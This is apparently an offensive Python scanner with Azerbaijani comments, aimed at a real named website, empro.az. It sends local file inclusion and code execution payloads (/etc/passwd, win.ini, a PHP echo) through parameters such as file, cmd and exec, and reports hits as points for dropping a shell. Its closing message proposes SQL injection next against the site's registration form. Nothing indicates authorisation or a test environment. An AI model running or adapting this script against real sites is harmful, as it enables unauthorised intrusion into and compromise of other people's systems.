import asyncio
import httpx

TARGET = "https://empro.az"

# Serverdə kod işlətməyə imkan verən kritik parametrlər
VULN_PARAMS = [
    "file", "page", "dir", "path", "cmd", "exec", "include", "source"
]

# Sınaq üçün bəsit test komandaları
PAYLOADS = [
    "/etc/passwd", "C:/Windows/win.ini", "<?php echo 'HACKED'; ?>", "index.php"
]

async def check_vulnerability(param, payload, client):
    # Saytın daxili strukturu: empro.az?file=payload
    url = f"{TARGET}/?{param}={payload}"
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        response = await client.get(url, headers=headers, timeout=10)
        
        # Əgər server bizə 'root' istifadəçisini və ya 'index.php' kodunu göstərsə
        if "root:" in response.text or "Index of" in response.text or "HACKED" in response.text:
            print(f"🔥 [CRITICAL] ZƏİFLİK TAPILDI: {url}")
            print(f"🚩 Bu nöqtədən sayta SHELL ata bilərik!")
            return True
    except:
        pass
    return False

async def main():
    print(f"🔍 [SCAN] RCE və LFI BOŞLUQLARI YOXLANILIR: {TARGET}")
    async with httpx.AsyncClient(verify=False) as client:
        tasks = []
        for p in VULN_PARAMS:
            for l in PAYLOADS:
                tasks.append(check_vulnerability(p, l, client))
        
        await asyncio.gather(*tasks)
    print("\n[!] Skan bitdi. Əgər nəticə yoxdursa, saytın daxili qeydiyyat formasından (Register) SQL-injection sınağı etməliyik.")

if __name__ == "__main__":
    asyncio.run(main())
